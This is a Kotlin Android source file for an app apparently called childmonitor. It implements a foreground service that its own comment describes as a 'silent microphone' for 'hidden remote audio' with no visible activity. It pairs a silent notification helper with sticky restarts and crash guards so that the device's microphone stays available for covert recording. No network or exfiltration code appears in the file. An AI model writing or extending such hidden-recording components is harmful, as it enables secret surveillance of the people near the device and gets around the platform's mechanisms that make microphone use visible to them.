package com.childmonitor.capture

import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.content.ContextCompat
import com.childmonitor.SilentNotificationHelper
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

/** Silent microphone FGS for hidden remote audio — no MainActivity. */
class AudioStreamForegroundService : Service() {

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        // P2-2: Do NOT call promoteToForeground() here. onStartCommand() follows onCreate()
        // on the same thread and will satisfy Android's 5-second startForeground() requirement.
        // The duplicate onCreate() call caused a redundant startForeground() IPC and a second
        // signalForegroundReady(true) that, while harmless (CountDownLatch ignores extra
        // countDown() calls), added noise and could race with the latch consumer.
        Log.i(TAG, "onCreate — audio FGS created, awaiting onStartCommand")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand action=${intent?.action} startId=$startId")
        return ForegroundServiceCrashGuard.runOnStartCommand(TAG, this) {
            if (!promoteToForeground()) {
                ForegroundServiceCrashGuard.abandonStartup(this, TAG, "audio_promote_failed")
                START_NOT_STICKY
            } else {
                START_STICKY
            }
        }
    }

    override fun onDestroy() {
        Log.i(TAG, "onDestroy — releasing audio FGS foreground state")
        foregroundActive = false
        super.onDestroy()
    }

    override fun onTimeout(startId: Int, fgsType: Int) {
        TypedStreamFgsTimeout.handle(this, TAG, StreamKind.AUDIO)
    }

    private fun hasRecordAudioPermission(): Boolean =
        ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) ==
            PackageManager.PERMISSION_GRANTED

    private fun promoteToForeground(): Boolean {
        val notification = SilentNotificationHelper.buildForegroundNotification(this)
        val micGranted = hasRecordAudioPermission()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE && !micGranted) {
            Log.e(
                TAG,
                "Audio FGS blocked — RECORD_AUDIO not granted (API ${Build.VERSION.SDK_INT}); " +
                    "promoting best-effort then abandoning",
            )
        }
        val promoted = ForegroundServiceCrashGuard.promoteBestEffort(
            service = this,
            notificationId = NOTIFICATION_ID,
            notification = notification,
            preferredTypes = ForegroundServiceCrashGuard.audioPromotionTypes(),
        )
        if (!promoted) {
            foregroundActive = false
            startRequested = false
            signalForegroundReady(false)
            return false
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE && !micGranted) {
            foregroundActive = false
            startRequested = false
            signalForegroundReady(false)
            return false
        }
        foregroundActive = true
        startRequested = false
        Log.i(
            TAG,
            "Audio FGS promoted (API ${Build.VERSION.SDK_INT}) " +
                "recordAudioGranted=$micGranted",
        )
        signalForegroundReady(true)
        return true
    }

    companion object {
        private const val TAG = "AudioStreamFgSvc"
        private const val NOTIFICATION_ID = SilentNotificationHelper.NOTIFICATION_ID
        private const val DEFAULT_WAIT_MS = 8000L

        @Volatile
        private var foregroundActive = false

        private val readyLatch = AtomicReference<CountDownLatch?>(null)

        @JvmStatic
        fun isActive(): Boolean = foregroundActive

        private fun hasRecordAudioPermission(context: Context): Boolean =
            ContextCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO) ==
                PackageManager.PERMISSION_GRANTED

        @JvmStatic
        fun startAndWait(context: Context, timeoutMs: Long = DEFAULT_WAIT_MS): Boolean {
            if (foregroundActive) {
                return true
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE &&
                !hasRecordAudioPermission(context)
            ) {
                Log.e(
                    TAG,
                    "startAndWait blocked — RECORD_AUDIO not granted before MICROPHONE FGS start",
                )
                return false
            }
            val latch = CountDownLatch(1)
            readyLatch.set(latch)
            try {
                start(context)
                val signaled = latch.await(timeoutMs, TimeUnit.MILLISECONDS)
                return signaled && foregroundActive
            } catch (e: InterruptedException) {
                Thread.currentThread().interrupt()
                return false
            } finally {
                readyLatch.compareAndSet(latch, null)
            }
        }

        @Volatile
        private var startRequested = false

        fun start(context: Context) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE &&
                !hasRecordAudioPermission(context)
            ) {
                Log.e(
                    TAG,
                    "start blocked — RECORD_AUDIO not granted; skipping startForegroundService",
                )
                signalForegroundReady(false)
                return
            }
            startRequested = true
            val intent = Intent(context, AudioStreamForegroundService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: SecurityException) {
                startRequested = false
                Log.e(TAG, "SecurityException starting audio foreground service — check RECORD_AUDIO", e)
                signalForegroundReady(false)
            } catch (e: Exception) {
                startRequested = false
                Log.w(TAG, "Could not start audio foreground service", e)
                signalForegroundReady(false)
            }
        }

        fun stop(context: Context) {
            if (!startRequested && !foregroundActive) {
                return
            }
            // Android crashes the app if stopService runs before startForeground().
            readyLatch.get()?.let { latch ->
                try {
                    latch.await(500, TimeUnit.MILLISECONDS)
                } catch (_: InterruptedException) {
                    Thread.currentThread().interrupt()
                }
            }
            startRequested = false
            foregroundActive = false
            context.stopService(Intent(context, AudioStreamForegroundService::class.java))
        }

        @JvmStatic
        fun stopSafely(context: Context, reason: String) {
            if (!foregroundActive) return
            Log.i(TAG, "stopSafely reason=$reason")
            stop(context)
        }

        private fun signalForegroundReady(success: Boolean) {
            if (!success) {
                foregroundActive = false
            }
            readyLatch.get()?.countDown()
        }
    }
}
